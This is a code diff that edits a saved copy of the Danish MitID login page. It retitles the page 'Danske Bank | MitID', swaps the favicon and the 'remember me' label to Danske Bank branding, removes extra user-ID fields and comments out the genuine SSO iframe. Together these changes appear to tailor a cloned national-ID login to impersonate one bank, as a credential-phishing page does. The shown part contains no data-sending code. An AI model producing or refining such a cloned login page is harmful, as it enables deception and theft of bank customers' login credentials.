@@ -6,10 +6,10 @@
         <meta http-equiv="X-UA-Compatible" content="IE=11" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-        <title>MitID</title>
+        <title>Danske Bank | MitID</title>
         <!--<base href="/">-->
         <base href="." />
-        <link rel="icon" type="image/png" href="https://www.mitid.dk/mitid-administrative-idp/favicon.ico" />
+        <link rel="icon" type="image/png" href="https://danskebank.mitid.dk/favicon.ico" />
         <link rel="stylesheet" href="../MitID_files/styles.css" />
         <link rel="stylesheet" href="../MitID_files/otherstyles.css" />
         <script defer type="module" src="../MitID_files/script.js"></script>
@@ -85,52 +85,8 @@
                                             </button>
                                         </div>
                                     </div>
-                                    <div class="mitid-core-user__input" defaultlanguage="DA / DK">
-                                        <input
-                                            class="mitid-core-user__user-id"
-                                            id="username0"
-                                            name="username0"
-                                            minlength="1"
-                                            type="text"
-                                            autocomplete="off"
-                                            required=""
-                                            spellcheck="false"
-                                        />
-                                        <div
-                                            id="hideUserNameBtn0"
-                                            name="hideUserNameBtn0"
-                                            role="button"
-                                            aria-label="Skjul bruger-ID"
-                                            aria-controls="username0"
-                                            class="mitid-core-user__hide_btn"
-                                            tabindex="0"
-                                        >
-                                            Skjul
-                                        </div>
-                                    </div>
-                                    <div class="mitid-core-user__input" defaultlanguage="DA / DK">
-                                        <input
-                                            class="mitid-core-user__user-id"
-                                            id="username1"
-                                            name="username1"
-                                            minlength="1"
-                                            type="text"
-                                            autocomplete="off"
-                                            required=""
-                                            spellcheck="false"
-                                        />
-                                        <div
-                                            id="hideUserNameBtn1"
-                                            name="hideUserNameBtn1"
-                                            role="button"
-                                            aria-label="Skjul bruger-ID"
-                                            aria-controls="username1"
-                                            class="mitid-core-user__hide_btn"
-                                            tabindex="0"
-                                        >
-                                            Skjul
-                                        </div>
-                                    </div>
+                                    <br />
+                                    <div id="helpMessage">Bruger-ID må ikke have mellemrum.</div>
                                     <div class="mitid-core-user__input" defaultlanguage="DAﾠ/ﾠDK">
                                         <input
                                             class="mitid-core-user__user-id"
@@ -388,7 +344,7 @@
                                 </div>
                             </div>
                             <label class="mitid-checkbox mitid-checkbox_user-id" for="mitid-remember-me"
-                                ><span class="mitid-checkbox__label">Husk mig hos MitID.dk</span
+                                ><span class="mitid-checkbox__label">Husk mig hos Danske Bank</span
                                 ><input
                                     id="mitid-remember-me"
                                     class="mitid-checkbox__input"
@@ -598,7 +554,7 @@
                 //     });
             </script>
 
-            <div id="sso-client" hidden="">
+            <!-- <div id="sso-client" hidden="">
                 <iframe
                     id="sso-mitid-iframe"
                     sandbox="allow-same-origin allow-scripts"
@@ -606,7 +562,7 @@
                     onload="getSSO(this);"
                     src="./MitID_files/sso-client.html"
                 ></iframe>
-            </div>
+            </div> -->
 
             <script>
                 function submitCoreClientAuthorizationCode(authorizationCode, sessionId) {
